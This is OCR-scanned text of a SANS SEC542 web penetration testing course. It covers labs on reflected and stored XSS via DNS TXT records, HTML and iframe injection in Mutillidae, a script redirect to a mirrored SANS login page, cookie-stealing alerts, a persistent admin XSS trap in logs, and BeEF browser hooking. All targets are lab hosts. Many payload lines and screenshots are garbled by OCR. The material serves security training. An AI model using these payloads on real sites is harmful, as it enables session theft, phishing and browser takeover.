Feel free to freestyle and try other commands. 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 4.1: XXE 
9 
"' 
!Objectives 
• 
• 
• 
Gain hands-on experience with XSS (Cross-Site Scripting) 
Demonstrate reflected XSS via a vulnerable web application 
Exploit stored inter-protocol XSS to perform the following steps via DNS TXT records: 
o 
Display a JavaScript alert pop-up 
o 
Load and execute an external JavaScript file to display an alert pop-up 
o 
Load and execute an external JavaScript file to execute 'shake.js' 
!Lab Setup 
Open Firefox and go to the DNS lookup site by going to Exercises Toolbar -> DNS Lookup (URL is: 
http://sec542.org/dns/). 
e Orupi\l 
v' H•wth1e1!d 
IJ:j HTrP Request/ Re;ponse 
l Muti!!ldae 
• phpbb 
msnake 
ffli Sheil,hnck Netstaugi 
ffl! $Ql Jnjruion 
a user An:ount H.1rwrung 
Ill Web Authemkati<.m. sask 
ill Web Autoenti<atkm • Orgest 
Ill Web Authentication • Fcrms 
Ill Wd; Calendar 
Ill Wordpr,,ssAdmin 
mioo: 
Begin by looking up sec542.org. Enter "sec542.org" in the form and press "Submit": 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 4.2: XSS 
1 
Then scroll through the results. Note the value of the TXT record: 
MX 
NS 
and thanks !or aH the fish. 
SRV 
CNAME 
DNS TXT records contain free-form text. Common uses include Sender Policy Framework (SPF) (RFC 
7208) and DomainKeys Signed Mail (DKIM), but TXT records may be used for virtually any propose. 
They may contain ASCII text ... including JavaScript. 
That TXT record is served from the bind name server running on the Security542 Linux VM. The DNS 
zone file for sec542.org is located at /etc/bind/zones/sec542.org.db, here is the beginning of that file: 
1$TTL 86480 
1sec542.org. 
i 
.org , 
nsl n 
IN 
IN 
IN 
IN 
IN 
IN 
IN 
IN 
IN 
rn 
SOA 
A 
NS 
NS 
MX 
MX 
TXT 
A 
A 
A 
ns 1. sec542 .. o rg. adm1n. se,c542. ore. 
{ 
2918930181 
28889 
369,(J 
694899 
38409 
192.168.1.8 
nsl.sec542.org. 
ns2.sec542.org. 
19 
ma1l.sec542.org. 
29 
mai 12 .. sec542. o rg. 
•so long, and thanks for a\l the 
" 
192.168.1,8 
192.168.1.23 
You may view this zone file by typing: 
$ cat /etc/bind/zones/sec542.org.db 
We will use a different zone for this lab: sec542.info. The zone file is located at 
/etc/bind/zones/sec542.info.db 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 4.2: XSS 
'--' 
'---' 
"-' 
'---' 
'-' 
'-' 
'-.-/ 
'-.../ 
'-' 
'-./ 
'-.../ 
,.__, 
'-..J 
,.__, 
'-' 
'-' 
'-' 
,.__, 
'-.../ 
,.__, 
'-' 
'-.-/ 
,.__, 
'---' 
,.__, 
'---' 
'-' 
'-' 
'--' 
\_, 
\_, 
'-' 
'---' 
'-.-/ 
\_, 
,.__, 
,.__, 
'-.-/ 
'-.-/ 
2 
\_, 
'-.../ 
'-..., 
jchallenge: No Hints 
Perform the following steps via the DNS lookup site at http://sec542.org/dns/ 
• 
Demonstrate reflected XSS by creating a JavaScript pop-up alert 
• 
Perform these steps using stored inter-protocol XSS via sec542.info's zone by editing 
/etc/bind/zones/sec542.info.db, restarting bind, and looking up sec542.info via the DNS lookup site 
• 
Demonstrate the same pop-up alert 
• 
Create an external JavaScript file at http:/ /sec542.org/alert.js and load it to send pop-up alert 
• 
Load and execute an external JavaScript file located at http://sec542.org/shake.js. (Warning: It 
will 'shake' the web page and play music if your speakers are on and the VM is able to use the 
host's speakers.) 
Remember to use sec542.info for this lab. The other zones (sec542.org and sec542.com) are used for other 
labs; sec542.info is used only for this lab. 
Be careful editing the zone file: Any syntax error will break DNS resolution for the sec542.info zone. Please 
use the following script to check the zone configuration and start bind (password is "Security542"): 
$ sudo /usr/local/bin/bind-reload.sh 
Note that DNS TXT records must have balanced double quotes around the value. 
For bind experts: We are restarting bind (and not simply reloading the zone) to simplify the lab, so there is 
no need to increment the DNS serial number. 
You may also start over with a fresh (clean) zone file. Note: This will erase the current zone file and replace 
it with an original copy (password is "Security542"): 
$ sudo /usr/local/bin/bind-reset-original.sh 
Step-by-step instructions begin on the next page. 
Choose your own difficulty! 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 4.2: XSS 
3 
jstep-by-Step Instructions 
Reflected XSS 
Open Firefox and surf to http:/ /sec542.org/dns/ 
Enter the following in the form {feel free to use the string of your choice): 
<script>alert{'XSS!'}</script> 
Then press "Submit". You should see the following output: 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 4.2: XSS 
'---' 
\._,I 
'-' 
'--' 
'--' 
'-.../ 
-.._/ 
'--' 
·--...., 
'-.../ 
'-.../ 
'-'' 
'---' 
'-../ 
'-.../ 
'-" 
'--. 
'-.../ 
"--- 
'-.../ 
'-" 
'---' 
'-../ 
'---' 
'---' 
.,_,.. 
'---' 
'---' 
'--- 
'---' 
'-.../ 
'-" 
.'----' 
'-.../ 
'-' 
'-.../ 
'-.../ 
'-.../ 
'-.--' 
'-' 
4 
'-../ 
'----' 
'--' 
Stored Inter-protocol XSS: Pop-Up Alert 
Edit sec542.info's zone file: 
$ gedit /etc/bind/zones/sec542.info.db 
Change the TXT record value from "42" to "<script>alert('XSS via DNS!')</script>": 
sec542. info. IN 
TXT 
"<script>alert('XSS via DNS!')</script>" 
sec542.info. 
sec542 
.. info. 
sec542.info. 
sec542.info. 
nsl 
mail 
IN 
IN 
IN 
IN 
1N 
IN 
rn: 
SOA 
A 
NS 
MX 
TXT 
A 
A 
nsl.sec542.info. admin.sec542.info. 
C 
2018030182 
28808 
3688 
604806 
~84€10 
192.168. LS 
nsl.sec542.info. 
11:l 
mail. sec542. info. 
"<script>alert ( 'XSS via DNS ! '); </script>" 
192 .. 168.1.8 
192. 168 . 1. 8 
Make sure the bal need double quotes remain in the TXT record (they are required). 
Press "Save" and t pe the following command to check the zone configuration syntax and restart 
bind (password is 'Security542"): 
$ sudo /usr/local/bin/bind-reload.sh 
You will see the following if you were successful: 
~p 
-]$ sudo 
r/local/bin/bind-reload.sh 
:rsudol password for student: 
;Checking zone configuration syntax .•. 
:zone sec542. info/IN: loaded serial 2818030102 
!OK 
Looks good, restarting bind .•. 
* Stopping domain name service .•. bind9 
waiting for pid 6486 to die 
OK l 
~ 
~~ 1 ;t;,_r_t1_
· n_g_do_,m_a_i_n_n_a_
.m_e_s_e_r_v1_
· c_e_. _
· _
· -b-in_,d_g_
· 
o_K __ 
l _......,1 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 4.2: XSS 
5 
If you see the following, you have made a syntax error (note the mention of "unbalanced quotes"): 
\../ 
'-..,./ 
'--' 
~
,.;:,c_orl@);''c'~;c;;,&:zs<·1'-c<»;x,s,,,,~~;h_ 
configuration syntax ... 
ldns rdata fromtext: /etc/bind/zones/sec542.info.db:12: near eot : 
Iced- quotes 
'zone sec542.info/IN: loading from master file /etc/bind/zones/sec542. 
'o. db failed: unbalanced quotes 
zone sec542.info/IN: not loaded due to errors. 
'-._./ 
'-._./ 
Your configuration has an error, please check your syntax 
!Re-edi.t the zone file and fix the syntax error: 
gedit /etc/bind/zones/sec542.info.db 
;You may start over and reload the original zone file by typing 
this command (use the student account password): 
sudo bind-reset-original.sh 
..__, 
'--' 
'-._./ 
'--' 
..__, 
'-' 
'-' 
'-' 
Edit the file with gedit and repair your syntax. You may also start over with a fresh (clean) zone file. 
Note: This will erase the current zone file and replace it with an original copy (password is 
"Security542"): 
$ sudo /usr/local/bin/bind-reset-original.sh 
Next: Open Firefox and surf to http://sec542.org/dns/ 
'-' 
'-' 
'-' 
'-.../ 
'-._./ 
'-' 
'-._./ 
'-' 
'-' 
'-.../ 
'-' 
'-' 
'-' 
'-" 
..__,. 
'-' 
'-' 
'-" 
'-..J 
'-' 
'---" 
'-' 
'-.._j 
'---" 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 4.2: XSS 
6 
'---" 
'-' 
"-..., 
Then search for "sec542.info" and press "Submit": 
XSSvia DNS! 
Stored Inter-protocol XSS: Pop-Up Alert via External .js 
File 
Use gedit to create /var/www/html/alert.js: 
$ gedit /var/www/html/alert.js 
Enter the following: 
alert("XSS via DNS and external .js file!"); 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 4.2: XSS 
7 
Save the file and exit gedit. 
Then edit sec542.info's zone file: 
\.._/ 
'-' 
'-' 
$ gedit /etc/bind/zones/sec542.info.db 
Change the TXT record value to" <script src='//sec542.org/alert.js'></script>": 
'-' 
'-" 
'-' 
sec542.info. 
IN 
TXT 
"<script src='//sec542.org/alert.js'></script>" 
Press "Save" and type the following command to check the zone configuration syntax and restart 
bind (password is "Security542"): 
$ sudo /usr/local/bin/bind-reload.sh 
If you receive an error, check and edit your syntax and try again. See the previous section for more 
information. 
Next: Open Firefox and surf to: http:/ /sec542.org/dns/ 
Then search for "sec542.info" and press "Submit": 
xss via ONS and external .ls file! 
Note: When loading external .js file, Firefox may cache old versions. If you see old content after 
updating a .js file, clear Firefox's cache by clicking on the "hamburger menu" in the upper right, and 
go to Preferences-> Privacy. Note this is only necessary if you see old .js content, otherwise skip 
this step. 
'-" 
'-" 
'-' 
'-" 
'-.../ 
'-.../ 
'-" 
'-.../ 
'-.../ 
'-' 
'-.../ 
'-.../ 
'-.../ 
'-' 
'-.../ 
'-.../ 
'-.../ 
'-.../ 
'-.../ 
'-.../ 
'-' 
'-.../ 
'-.../ 
'-.../ 
'--/ 
'--/ 
'-' 
'-' 
'-' 
'-' 
'-' 
'-' 
'-' 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 4.2: XSS 
8 
'-' 
'--/ 
'-' 
5 
- ...... 
=· '41111111111 
Then click "clear your recent history". 
Privacy 
Tr.u:klftg 
-J' tl~ ir.:«:mt Pro1i«twiHl in Pnlf.;ti! W~'W"i 
Ln1ttn <f'.Om 
¥vu Cilrl .J!SO ITTJ.!klg:1' '(i}Uf 
No, lr,R!i( 'W,Lng;, 
History 
fifdo;: rl'ilt R~~t l'llstlJI)' 
.ir~roi mil nma,mllllr y'()nt rutl!h''ttng, ~l'l!UJ 
y<)UVI>'!, 
w;4tioft ht 
-·~ 
Ut'°A !,Ile !OQtK!l\ !Hf. ~.;n: 
Ji»itH)' 
Stored Inter-protocol XSS: "Shake" via External .js File 
Edit sec542.info's zone file: 
$ gedit /etc/bind/zones/sec542.info.db 
Change the TXT record value to" <script src='//sec542.org/shake.js'></script>": 
sec542.info. 
IN 
TXT 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
"<script src='//sec542.org/shake.js'></script>" 
Lab 4.2: XSS 
9 
'--' 
... 
sec542.infa.dil fleWilind/mnes) • gedit 
.. + X l 
) 
sec542.info. 
sec542.info. 
sec:542.info. 
sec542.info. 
nsl 
mail 
IN 
IN 
IN 
IN 
IN 
IN 
IN 
SOA 
A 
NS 
MX 
TXT 
A 
A 
ns1.sec542.info. admin.sec542.info. 
( 
2@1803U02 
28800 
3600 
604800 
~8400 
192.168. LS 
ns1.sec542.info. 
10 
mail. seesez. info. 
src•'//sec542.org/shake.js'></script>• 
192.168.1.8 
192.168. 1.8 
'----' 
'----' 
'-' 
..._,, 
'-.../ 
'----' 
'----' 
'----' 
'----' 
Press "Save" and type the following command to check the zone configuration syntax and restart 
bind (password is "Security542"): 
$ sudo /usr/local/bin/bind-reload.sh 
If you receive an error, check and edit your syntax and try again. See the "Stored Inter-protocol 
XSS: Pop-Up Alert" section for more information. 
Next: Open Firefox and surf to: http://sec542.org/dns/ 
Note: shake.js will shake the screen and (attempt) to play music. 
'----' 
'-' 
'----' 
'----' 
'----' 
'-' 
'----' 
'----' 
'----' 
'----' 
'----' 
'-.../ 
'----' 
Then search for "sec542.info" and press "Submit": 
'-.../ 
'----' 
'----' 
..._,, 
'-' 
'----' 
'-.../ 
'-' 
'----' 
'-../ 
'----' 
'----' 
'----' 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 4.2: XSS 
10 
'----' 
'-../ 
'----' 
" 
" 
,,----._ 
" 
,,---._ 
,,---._ 
-------- 
~ 
~ 
~ 
~ 
,,---._ 
,,----._ 
,,----._ 
~ 
~ 
" 
~ 
,,.......,, 
~ 
,,.......,, 
,,.......,, 
~ 
~ 
,,..._, 
~ 
~ 
"' 
"' 
"' 
~ 
jcredits 
~ 
' ' ' ' 
A 
MX 
SRV 
Shake it up!! Be sure to scroll down to the section beginning with "A", "MX", etc., to see more 
shaking. 
The music requires your speakers to be turned on, and the VM must have virtual access to them. 
Check your speaker volume, and check following if you don't hear anything: 
• 
VMware Workstation: VM -> Removable Devices-> Sound Card 
• 
VMware Workstation Player: Player-> Removable Devices-> Sound Card 
• 
VMware Fusion: Virtual Machine -> Sound Card 
Press the Firefox "Home" button to stop the music. 
There is a BeEF lab coming up later: As a bonus step, at the end of the BeEF lab, hook a browser via 
a DNS TXT record lookup. 
Credit (and thanks} for this idea and software to: 
• 
Jamie Hankins (Twitter: @ijamieh} 
• 
Erick Setiawan (https://github.com/ericksetiawan/dns-lookup} 
• 
Jonathan Davis (https://www.jonathandavis.me.uk/2014/09/writing-a-dns-look-up-tool/} 
• 
Devin Walters (https://gist.github.com/devn/5007287#file-harlem-shake-js} 
o 
Note that the original shake.js used the copyrighted "Harlem Shake" mp3, so this lab 
uses a classic public domain song instead 
\ 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 4.2: XSS 
11 
\ 
\ 
;_ : •.... · •• ·• ~ lE~~nciSe-'?1:.~ - f!'NMPH)n}.eGt(on 
••••• 
.·_· ·• · · ••••• \ 
< -,,,-, 
~ 
,,--C =-~ 
-.:- ~- _ 
-: = ~ -~ 
- - 
_ 
7+ -- - -:,'=, 
-;:- ';:' 
~ 
%_ 
X ~~ - 
- - --: 
~- 
~- 
- 
~ - 
~- 
=- 
" 
I Objectives 
• 
Explore HTML injection flaws 
• 
Work with stored XSS flaws 
• 
Cause various impacts through HTML injection and XSS exploitation 
• 
Injecting attacker-chosen images into browser session 
• 
Inject content to redirect a browser 
ILabSet:up 
Open Firefox and go to Exercises toolbar -> Mutillidae 
Go to OWASP 2017 -> A7 - Cross Site Scripting (XSS) -> Persistent (Second Order)-> Add to your blog 
OWASP MutHHclae n: Web Pwn in Mass Procluction 
Video Tutorials 
I Listing of vulnerabi!ltles 
You may clear the database at any time by choosing Reset DB: 
This cleanly restarts the exercise. 
Useful for clearing out old attempts. 
OWASP.MutHHdae II: Web Pwn in Mass .. Production 
1 What Should I Do? 
You 
Video Tutorlafs 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 4.3: HTML Injection 
1-A 
!challenge: No Hints 
'----
Target:http://mutillidae/index.php?page=add-to-your-blog.php 
Perform the following command injections on the blog: 
• 
HTML Hl tag injection 
• 
HTML image injection 
• 
iframe inject the blog into the blog 
• 
iframe redirect the entire page to another 
Perform the following stored XSS exploits on the blog and also View Log 
• 
Pop up a string 
• 
Pop up the cookie 
'---- 
'-..,
'- 
'-..,
'-
'-..,
'---' 
'-..,
'-'
Note: The View Log button is next to Reset DB. 
Note: You may use this (large) image for HTML image injection: http:/ /127. o. o .1/earth. jpg 
Note: For "iframe redirect the entire page to another," you may use an offline copy of the SANS portal that 
we mirrored here: http:/ /127. O. O. 1/www.sans.org/ account/ 
Step-by-step instructions begin on the next page. 
'-'
'-...., 
'-...., 
'-...., 
'---'
'-...., 
'-...., 
'-" 
Choose your own difficulty! 
'-"
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 4.3: HTML Injection 
'-'
'-' 
'-' 
'-' 
'---' 
.___,. 
'-" 
'-...., 
'-" 
.____, 
'-.., 
\....,. 
'- 
'- 
'-.., 
'- 
"--- 
'- 
2-A 
'- 
'- 
'- 
lstep-b),(-Step Instructions 
HTML Injection 
Enter the following in the blog: 
Sec542!</hl> 
Then click Save Blog Entry and scroll down to see our HUGE text!!! 
2 Current. Blog Entries 
Name· 
Date 
1 
anoeymous 
2014-(19-0410:16:49 
Sec542! 
200FJ..03-01 22:27:11 
An .anonymous blog?· Huh? 
So, What? 
Injecting a set of Hl tags isn't exactly 31337 haxoring, right? 
The point is: The website is not stripping out our HTML tags. 
• 
It is specifically not removing the"<" and ">" characters 
" 
This means: We are on the road to pwnage. 
If we can successfully inject tags such as <h l>, there's an excellent chance that we can inject other, more 
interesting, tags and content. 
FYI: The road to pwnage is called "Pwn Road" by locals. 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 4.3: HTML Injection 
3-A 
Image Injection 
..._,, 
'-' 
Let's ramp things up a bit and see if we can inject an image into the blog. 
'-' 
We'll use a large image for maximum effect: 
• 
In this case, we use the Blue Marble, one of the most famous photos of all time 
• 
Because astronaut photographers rock 
• 
We have stashed a copy of the Blue Marble for you in /var /www /html/ earth. j pg. It is 
accessible via http:// 12 7. 0. O. 1/ earth. j pg. 
'-' 
\,J 
'-' 
'-' 
. .__,, 
\,J 
'-' 
Scroll up to Add Blog Entry and type the following: 
'-' 
'-' 
<img src= "http: //127. O. O .1/ earth .. jpg11 > 
'..J 
\,J 
Then, click Save Blog Entry and scroll down 
'-' 
rlVN·Mff>'~-.------ 
\ ~ ~- 
M!t"~#.:_~ 
I 
·dit-~-~-~,~- 
~--*Jl,,io,,l;~\1,,---.,..,_ 
/2 
flji,/i.i--.1 
\,J 
'-' 
'-' 
'-' 
'-' 
This is the Blue Marble, taken by the Apollo 17 crew on December 7, 1972. Apollo 17 was the last human 
lunar mission. 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 4.3: HTML Injection 
4-A 
'-' 
'-' 
'-' 
'-' 
'-' 
'-' 
.__,, 
'-' 
'-' 
'-' 
'-' 
'-' 
\,J 
'-' 
'-' 
'-' 
'-' 
'-' 
'-' 
\,J 
This image has the original orientation. {The South Pole is at the top.) If you find this confusing, you are not 
an astronaut, because there is no up in space. 
If you'd like to ramp things up, copy '<img src="http://127.0.0.1/earth.jpg">' and paste it into the blog a 
dozen times or so, and save the blog. 
Add 
for anonym,ous 
Note: <b>,<I> and <U> are now all
1owed In blog 
src="http: //127. 8. 8.1/earth. j pg11> 
src.=11http: 
.8.9.1/earth.j 
<im srca"http://127 .8.8.l/earth.jpg"> 
<J.m src=::"http://127 .e.&.1/earth. jpgn> 
<iffl src: .. http://127 .a,.EL. l/earth. jpg"> 
<ifJ.l s 
.: //127 .a.e, 1/earth. jpg
1'> 
<im src="http://127.8.8.l/earth.jpglt> 
<im src.=lthttp: / /127 ~ e. e. 1/earth. jpgtt> 
( 
save Blog Entry 
· · J 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 4,3: HTML Injection 
5-A 
iframe: Inject an Entire Web Page 
Let's inject the blog into the blog! 
• 
Because, much like astronauts, recursion rocks 
Click Reset DB, go to Firefox's address bar, and highlight this portion of the URL: 
mutillidae/index.php?page=add-to-your-blog.php 
'-_,I 
f http:1/mutL.ur-blog.php X 
http:/i1m!(ijjmffi4ijjii@0#$MiiM•i'l•UiiiMid ,~e'SvC.: 
Note: Please copy carefully, and omit anything after blog.php in the blog URL. 
Then press CTRL-C (copy). 
Type the following blog entry: 
<iframe src=11http:// 
• 
Then paste the URL 
• 
Then type: 
11 > 
It should look like this: 
<iframe 
11http://muti11idae/index.php?page=add-to-your-blog.php11> 
Note: Ensure it is one continuous line, with no breaks. 
Then, click Save Blog Entry, and click the Mutillidae Back icon 
Back 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 4.3: HTML Injection 
"-' 
'-.J 
'--' 
'---' 
'---' 
'---' 
'---' 
'-..../ 
'---' 
'---' 
'---' 
'-..../ 
'--" 
'--' 
''-...., 
'--" 
'--' 
'-..../ 
'--' 
'--" 
'-..../ 
'---' 
'--' 
'--" 
'--" 
'-..../ 
,,__,, 
'--' 
'-..../ 
.__,, 
'-..../ 
'---" 
'---' 
'---' 
'-..../ 
'-..../ 
6-A 
'-..../ 
'---' 
'--" 
Blog in the Blog 
The blog is now injected into the blog. 
2 Current Blog Entries 
Name 
Date 
Comment 
1 anonymous 
2017-02~06 08:41:03 
~o 
As Stephen Wright said, "I have an inferiority complex, but it's not a very good one." 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 4.3: HTML Injection 
7-A 
Page Redirection 
'--' 
Let's redirect the entire blog page to another. 
We will then helpfully ask the user to log back in to their SANS account. 
Click Reset DB and enter the following in the blog: 
'-' 
'-' 
-...J 
'-' 
<script>window.location="http://127.0.0.l/www.sans.org/account/11</script> 
'-' 
-...J 
Then save the blog entry. The page may redirect immediately; if not, click Back. 
'-' 
'-' 
We previously mirrored the SANS website with wget: 
# cd /var/www/html 
# wget -e robots=off -r -k -12 https://www.sans.org/account/login 
Note: This has already been done for you; we are showing you the steps so that you will know how to do 
the same thing in the future. 
The -e robots=off option tells wget to ignore robots.txt and mirror everything. The -r flag means 
recursive; -k tells wget to convert remote links to local; and -12 tells wget to recurse two levels deep. 
" 
X: 
ll!>WIA 
11' ~- 
Flnd 
Uve 
Online Training 
Use 
Enlal, Mim,ss 
Password 
0 Keep me klgged ln tor seven aays. 
11!11 
Fo1got ~"011r past\1e,:,rd? 
New Account 
Email Alldiess 
Password 
Coofimt PaSSWO!d 
We have logged you out for security purposes, so please log in. We take security seriously! 
Note that we have not mirrored the actual Login functionality; this redirection is meant as a proof of 
concept. 
'-" 
'-" 
'-" 
'-' 
'-" 
'-' 
'-" 
-...J 
'-" 
'-" 
'-' 
-...J 
-...J 
'-' 
'-' 
'-' 
'-" 
'-" 
'-" 
'-' 
'-' 
'-' 
'-" 
-...J 
'-" 
'-" 
'-" 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 4.3: HTML Injection 
8-A 
'-' 
'-../ 
'-" 
xss 
Click Reset DB and type the following blog entry: 
<i:tCript>alert ( H$eC542 ! II)</ SCript> 
Then, click Save Blog Entry. 
The pop-up should appear. 
Sec542!! 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 4.3: HTML Injection 
9-A 
XSS to Display the Cookie 
'-" 
Click Reset DB and type the following blog entry: 
>alert(doc'!,.:!JJ!,ent.cookie)c:;/script> 
Then click Save Blog Entry. 
The cookie pops up (note that your PHPSESSID will be different). 
PHPSESSID:;;:::lfk0l28rkmhlrgp71jqi9pim2:; showhlnts=n 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 4.3: HTML Injection 
'-..,' 
'----' 
'-..., 
'---" 
'----' 
'----' 
'-..., 
'----' 
'-....; ' 
'----' 
.'-.., 
'----' 
'-J 
'-..., 
'----' 
'----' 
'----' 
'----' 
'-...,· 
'--._./ 
'----' 
'-..,, 
'-..,, 
'----' 
'---' 
'---' 
'----' 
'---' 
'--._./ 
'----' 
'-J 
'-..., · 
'----' 
'-' 
'----' 
'-..., · 
10-A 
'--' 
'-.., 
'-' 
Persistent Admin XSS 
A particularly devious form of stored XSS is persistent ad min XSS exploits. The attacker places JavaScript in 
an unexpected location, such as a page name. The attacker lays a trap, waiting for the dutiful administrator 
to check the logs. 
Here is a typical vector for this attack, Mutillidae's View Log page: 
• 
Show the Hostname, IP, Browser Agent, Page Viewed, and Data/Time 
OWASPiM.utillidae I 
Lo 
Back 
Hel:p Me! 
Hints and Videos 
16 log records found 
Want to ffelp? 
4$ Refresh Logs 
Hostname 
IP 
Browser Agent 
Page Viewed 
Datemme 
127.0.0.1 
Mozilla/5.0 (Xll; Linux 
127 0 0 1
. i686; rv:50.0) 
· ·• 
·· 
· • · 
Gecko/20100101 
FirefoX/50.0 
Blog entry added 
by: anonymous 
2018-01-18 
05:24:46 
127.0.0.1 
Mozllla/5.0 rxir. Linux 
127 0 0 1 i686; rv:50.0} 
· · 
· 
•. 
Gecko/20100101 
FirefoX/50.0 
Sel.ected blog 
entries for 
anonymous 
2018-01-18 
05:24:46 
Let's leave a present for the administrator. 
" 
" 
Click "View Log". 
:::Co 
:::; 
~-:;-:;---~ Z.- --:;_ 
,: 
V'Rllit ~og ·· 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 4.3: HTML Injection 
11-A 
Create an Unusual Log Entry 
...__,, 
...__,, 
Our goal: Hack the Page Viewed field in Mutillidae's View Log page, and lay a trap for an administrator who 
later views the log. 
We have been using this URL: 
http://mutillidae/index.php?page=add-to-your-blog.php 
Let's hack the "page" option. Go to Firefox's address bar, and highlight this portion of the URL: 
http://mutillidae/index.php?page= 
When highlighting, leave out anything after page=. 
Then, press CTRL-C (copy). 
Paste the partial URL into Firefox's address bar: 
http://mutillidae/index.php?page= 
Then, type the following immediately after the"=" sign: 
'--' 
'-' 
'-' 
'-' 
'-' 
'-' 
'-' 
'-' 
\,__/ 
'-' 
'----' 
'-' 
...__,, 
'-' 
'----' 
'-' 
'-' 
'-' 
'----' 
'-' 
'-' 
'-' 
...__,, 
<script>alert("Sec542!")</script> 
'-' 
The entire URL will now be: 
\,__/ 
\,__/ 
http://mutillidae/.1..uue.A 
2 ! II 
\,__/ 
'-J 
Then press Enter. You may see an immediate reflected pop-up; if so, click OK. You will then see an error, 
which is fine, and correct. There is no page called "<script>alert("Sec542!")</script>". 
Page Not fou~d 
Back 
" class="colorbox" title-"Help me with page "stylem"color: #000000;"> 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 4.3: HTML Injection 
Help Me! 
12-A 
'-../ 
'-....,' 
'-J 
\,__/ 
'-../ 
'----' 
'----' 
...__,, 
'-' 
'-,I 
'-' 
...__,, 
View the Log. 
,.....___ 
Click "View Log". 
-= -- 
-~ 
- 
- 
\111 <C -- ~lilf 
--Z' 
~~- 
~~-- 
Boom! 
We have sprung our trap. This portion of the exercise generated both a reflected and stored XSS - the 
stored portion is more interesting. 
For bonus points, pop up the cookie. Repeat steps 9 and 10, but replace "Sec542!" with 
document. cookie: 
hp?page=<scri t>alert(d 
t.cookie)< 
Here is the result: 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 4.3: HTML Injection 
13-A 
!special Thanks 
'-' 
The awesome Adrian Crenshaw (@irongeek_adc) initially created the project. 
Jeremy Druin (@webpwnized) maintains and constantly improves upon Mutillidae. 
Mutillidae is available at http://sourceforge.net/projects/mutillidae/files/mutillidae-project/ 
(https://cyber.gd/542_ 425) 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 4.3: HTML Injection 
'-.../ 
'---' 
'---' 
'---' 
'---' 
'---' 
'---' 
'---' 
'-' 
'---' 
'---' 
'-' 
'-.../ 
'--' 
'---' 
'--' 
'---' 
'---' 
'-.../ 
'---' 
'---' 
'---' 
'--' 
'---' 
'---' 
'-.../ 
'---' 
'---' 
'---' 
'-.../ 
'-.../ 
'---' 
'---' 
'-.../ 
'---' 
'--' 
14-A 
'--' 
'---' 
'---' 
"' 
I Objectives 
• 
• 
Become familiar with BeEF and its zombie-controlling awesomeness 
Explore various XSS payloads to cause a variety of impacts 
jLabSetup 
BeEF 
Open a terminal and start the BeEF Server: 
cd /opt/beef 
./beef 
Open Firefox and go to Exercises toolbar -> BeEF Control Panel 
Log in: 
• 
Username: beef 
• 
Password: beef 
!Jsernamec: 
beef 
Password: 
..... 
Click "Allow" if Firefox says, "Firefox has prevented the outdated plugin 'Adobe Flash' from running ... " Then 
press "Allow and Remember". 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 4.4: BeEF 
1 
Hook Chromium 
\._,I 
Open the Chromium browser. 
Click the "OMG Cute Bunny" bookmark at the top left. 
Awwww ... what a cute bunny! Pay no attention to the JavaScript running in your browser. It's a cute 
bunny! 
Chromium should now be hooked: Switch back to Firefox. To be clear, we are controlling BeEF via Firefox 
and hooking Chromium. 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 4.4: BeEF 
'--' 
'-./ 
'-./ 
'-../ 
'-../ 
'-../ 
'-./ 
'-./ 
'-./ 
'-./ 
'-../ 
'-../ 
'-./ 
''-../ 
'-../ 
'-../ 
'-./ 
'-../ 
'-../ 
'-../ 
'-./ 
'-../ 
'----' 
'----' 
'-../ 
'----' 
'-../ 
'-./ 
'-./ 
'-../ 
'-../ 
'-./ 
'-./ 
'----' 
'----' 
'-../ 
'-../ 
2 
'-./ 
'----' 
'-./ 
Note: Try to avoid hooking Firefox as well as Chromium. It is harmless to also hook Firefox, but this can 
lead to confusion on which commands are running in which browser. 
bunny.html is a minimal custom web page we built to illustrate the ease of hooking a browser in BeEF. 
Press <CTRL><U> to see the bunny.html source code in Chromium. Not much there! 
BeEF's built-in proof-of-concept page is "The Butcher" (available in the bookmark to the right of "OMG 
Cute Bunny"). It performs the same function but has a lot more code. 
Note: hook.js is dynamically created by BeEF: That file does not exist locally on the filesystem. You can 
view the contents of hook.js by downloading it (note that BeEF must be running): 
$ wget http://192.168.1.8:3000/hook.js 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 4.4: BeEF 
3 
View Hooked Browser Details 
'--' 
'---' 
Go back to Firefox and view the newly hooked Chromium browser. 
.ti 8 WtN.1.sec542.org 
0 Offlne Browsers 
Here's a close-up of the browser details: 
3 ca2·00:,,rv: &o,v,rMe,r 
_, ~ 
-~,;; 
5mwur Name: Chrome 
Bmwur Venion: 53 
l~tion 
l~ation 
like 
!r~mn 
Browser Language: en-.US 
Browser Platform: Lim.Ix i686 
Browser Ptugins: cmoowm PDF~. 
Window Size: Wdlh: 
779 
Initialization 
!~aoon 
l~mn 
lnltiallz:aoon 
\.._/ 
'----' 
'----' 
\.._/ 
\.._/ 
'----' 
'----' 
'-..,, 
'----' 
'----' 
'----' 
'----' 
\.._/ 
'-' 
'----' 
'--' 
\.._/ 
\.._/ 
Note: Chromium lists the following browser/technologies (beyond "Chrome" and "Chromium"): Mozilla, 
AppleWebKit, and Safari. 
